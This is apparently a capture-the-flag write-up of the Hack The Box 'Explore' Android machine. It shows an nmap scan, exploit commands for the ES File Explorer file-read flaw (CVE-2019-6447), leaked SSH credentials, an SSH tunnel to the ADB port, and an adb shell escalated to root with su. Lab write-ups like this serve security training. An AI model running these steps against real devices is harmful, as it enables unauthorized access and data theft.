<img src="https://github.com/thedarktech/HTB-Writeups/blob/main/Explore/Pasted image 20211022152451.png" />

# Enumeration
---
## Nmap Scan

```bash
# Nmap 7.91 scan initiated Fri Oct 22 14:03:27 2021 as: nmap -A -sC -sV -p- -O -oN nmap 10.10.10.247
Nmap scan report for 10.10.10.247
Host is up (0.18s latency).
Not shown: 65531 closed ports
PORT      STATE    SERVICE VERSION
2222/tcp  open     ssh     (protocol 2.0)
| fingerprint-strings: 
|   NULL: 
|_    SSH-2.0-SSH Server - Banana Studio
| ssh-hostkey: 
|_  2048 71:90:e3:a7:c9:5d:83:66:34:88:3d:eb:b4:c7:88:fb (RSA)
5555/tcp  filtered freeciv
42135/tcp open     http    ES File Explorer Name Response httpd
|_http-title: Site doesn't have a title (text/html).
59777/tcp open     http    Bukkit JSONAPI httpd for Minecraft game server 3.6.0 or older
|_http-title: Site doesn't have a title (text/plain).
Network Distance: 2 hops
Service Info: Device: phone

TRACEROUTE (using port 256/tcp)
HOP RTT       ADDRESS
1   185.07 ms 10.10.14.1
2   185.28 ms 10.10.10.247

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Oct 22 14:08:39 2021 -- 1 IP address (1 host up) scanned in 311.53 seconds

```

So here we have a ssh port running on 2222 a filtered ADB port on 5555 and two http ports on 42135 and 59777 so lets check the http first

<img src="https://github.com/thedarktech/HTB-Writeups/blob/main/Explore/Pasted image 20211022150911.png" />

port 42135 returns a error Not Found

<img src="https://github.com/thedarktech/HTB-Writeups/blob/main/Explore/Pasted image 20211022150947.png" />

while the 59777 returns the forbidden error

---

## Foothold

So lets check for the ES file explorer vulnerability
after searching on google for ES file explorer open port vulnerability you can see a exploitdb post on Arbitary File Read

https://www.exploit-db.com/exploits/50070

so just get that payload and save it locally 

by listing for the pictures you can see a creds.jpg 

```bash
└─# python3 exploit.py listPics 10.10.10.247 

==================================================================
|    ES File Explorer Open Port Vulnerability : CVE-2019-6447    |
|                Coded By : Nehal a.k.a PwnerSec                 |
==================================================================

name : concept.jpg
time : 4/21/21 02:38:08 AM
location : /storage/emulated/0/DCIM/concept.jpg
size : 135.33 KB (138,573 Bytes)

name : anc.png
time : 4/21/21 02:37:50 AM
location : /storage/emulated/0/DCIM/anc.png
size : 6.24 KB (6,392 Bytes)

name : creds.jpg
time : 4/21/21 02:38:18 AM
location : /storage/emulated/0/DCIM/creds.jpg
size : 1.14 MB (1,200,401 Bytes)

name : 224_anc.png
time : 4/21/21 02:37:21 AM
location : /storage/emulated/0/DCIM/224_anc.png
size : 124.88 KB (127,876 Bytes)

```

So lets go ahead and download it

```bash
└─# python3 exploit.py getFile 10.10.10.247 /storage/emulated/0/DCIM/creds.jpg                                  1 ⨯

==================================================================
|    ES File Explorer Open Port Vulnerability : CVE-2019-6447    |
|                Coded By : Nehal a.k.a PwnerSec                 |
==================================================================

[+] Downloading file...
[+] Done. Saved as `out.dat`.
```

---

## User

Now the script will save the data in file out.dat so just rename it to creds.jpg

and here you can see the image with ssh credentials in it

<img src="https://github.com/thedarktech/HTB-Writeups/blob/main/Explore/creds.jpg" />

```creds
kristi:Kr1sT!5h@Rp3xPl0r3!
```


```bash
└─# ssh kristi@10.10.10.247 -p 2222                                                           
Password authentication
Password: 
:/ $ id
uid=10076(u0_a76) gid=10076(u0_a76) groups=10076(u0_a76),3003(inet),9997(everybody),20076(u0_a76_cache),50076(all_a76) context=u:r:untrusted_app:s0:c76,c256,c512,c768
:/ $ whoami
u0_a76
2|:/ $ cd sdcard
:/sdcard $ ls
Alarms  DCIM     Movies Notifications Podcasts  backups   user.txt 
Android Download Music  Pictures      Ringtones dianxinos 
:/sdcard $ cat user.txt
f32017174c7c7e8f50c6da52891ae250

```

And here we got the User flag

---

## Root

As we sow earlier there wa port 5555 filtered wich is basically used for adb in android
so lets create a ssh tnnel to forward it to our machine

```bash
sh kristi@10.10.10.247 -p 2222 -L 5555:127.0.0.1:5555   
Password authentication
Password: 
:/ $
```

This will create the ssh tunnel to forward 5555 port to our machine
now lets connect using adb

```bash
adb connect 127.0.0.1:5555
```

after a successful connection you can see the device by doing

```bash 
adb devices
```

now for interacting with shell use

```bash
└─# adb -s 127.0.0.1:5555 shell
x86_64:/ $ id                                                                                                      
uid=2000(shell) gid=2000(shell) groups=2000(shell),1004(input),1007(log),1011(adb),1015(sdcard_rw),1028(sdcard_r),3001(net_bt_admin),3002(net_bt),3003(inet),3006(net_bw_stats),3009(readproc),3011(uhid) context=u:r:shell:s0
x86_64:/ $ su

:/ # id
uid=0(root) gid=0(root) groups=0(root) context=u:r:su:s0
:/ # whoami
root
:/ # cat /data/root.txt
f04fc82b6d49b41c9b08982be59338c5
:/ #                                                                                                                
```

Remember we used SU to switch to root from shell 

Rooted..!!!
